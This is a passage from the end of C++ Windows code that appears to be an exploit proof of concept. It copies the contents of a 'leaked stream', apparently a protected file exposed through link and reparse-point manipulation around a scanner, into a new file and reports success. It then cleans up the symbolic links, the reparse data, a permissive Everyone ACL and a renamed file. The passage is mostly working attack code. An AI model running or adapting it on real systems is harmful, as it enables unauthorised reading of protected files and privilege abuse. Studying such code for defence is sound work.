        printf("[-] Failed to open leaked stream, error: 0x%08lX\n", stat);
        return 1;
    }

    LARGE_INTEGER lif = {};
    if (!GetFileSizeEx(htempmv, &lif) || lif.QuadPart <= 0)
    {
        printf("[-] Leaked stream has no readable data, error : %lu\n", GetLastError());
        return 1;
    }

    wchar_t modulePath[MAX_PATH] = {};
    const DWORD moduleLength = GetModuleFileNameW(NULL, modulePath, MAX_PATH);
    if (!moduleLength || moduleLength >= MAX_PATH)
    {
        printf("[-] Failed to resolve executable path.\n");
        return 1;
    }
    const std::filesystem::path outputPath = std::filesystem::path(modulePath).parent_path() /
                                             (std::filesystem::path(argv[1]).filename().wstring() + L"." + mainguid);
    HANDLE outputFile = CreateFile(outputPath.c_str(), GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, ALL_SHARING, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!outputFile || outputFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create new file, error : %lu\n", GetLastError());
        return 1;
    }
    HANDLE outputMapping = CreateFileMapping(outputFile, NULL, PAGE_READWRITE, lif.HighPart, lif.LowPart, NULL);
    if (!outputMapping || outputMapping == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create file mapping, error : %lu\n", GetLastError());
        return 1;
    }
    HANDLE sourceMapping = CreateFileMapping(htempmv, NULL, PAGE_READONLY, lif.HighPart, lif.LowPart, NULL);
    if (!sourceMapping || sourceMapping == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create file mapping, error : %lu\n", GetLastError());
        return 1;
    }
    void* sourceView = MapViewOfFile(sourceMapping, FILE_MAP_READ, 0, 0, lif.QuadPart);
    void* outputView = MapViewOfFile(outputMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, lif.QuadPart);
    if (!sourceView || !outputView)
    {
        printf("Failed to map view of file, error : %lu\n", GetLastError());
        return 1;
    }
    memcpy(outputView, sourceView, static_cast<size_t>(lif.QuadPart));
    if (!FlushViewOfFile(outputView, static_cast<size_t>(lif.QuadPart)))
    {
        printf("[-] Failed to flush output, error: %lu\n", GetLastError());
        return 1;
    }
    UnmapViewOfFile(outputView);
    UnmapViewOfFile(sourceView);
    CloseHandle(sourceMapping);
    CloseHandle(outputMapping);
    CloseHandle(outputFile);
    printf("[+] Saved %lld bytes to %ls\n", lif.QuadPart, outputPath.c_str());
    CloseHandle(htempmv);
    CloseHandle(hworkdir);
    SetEvent(scanDone);
    const DWORD threadState = WaitForSingleObject(hthread, 5000);
    CloseHandle(hthread);
    if (threadState == WAIT_OBJECT_0)
        CloseHandle(scanDone);
    delete outputLink;
    delete scanLink;
    delete clfsLink;
    delete shadowdir;
    delete targetdir;

    UNICODE_STRING clnp = {};
    RtlInitUnicodeString(&clnp, renameInfo->FileName);
    OBJECT_ATTRIBUTES clnpobjattr = {};
    InitializeObjectAttributes(&clnpobjattr, &clnp, OBJ_CASE_INSENSITIVE, NULL, NULL);
    _NtDeleteFile(&clnpobjattr);
    free(renameInfo);
    HeapFree(GetProcessHeap(), 0, reparseData);
    LocalFree(sd);
    LocalFree(pACL);
    FreeSid(pEveryoneSID);
    CloseHandle(secondWorkDir);
    RtlFreeUnicodeString(&targetNtPath);
    return 0;
}
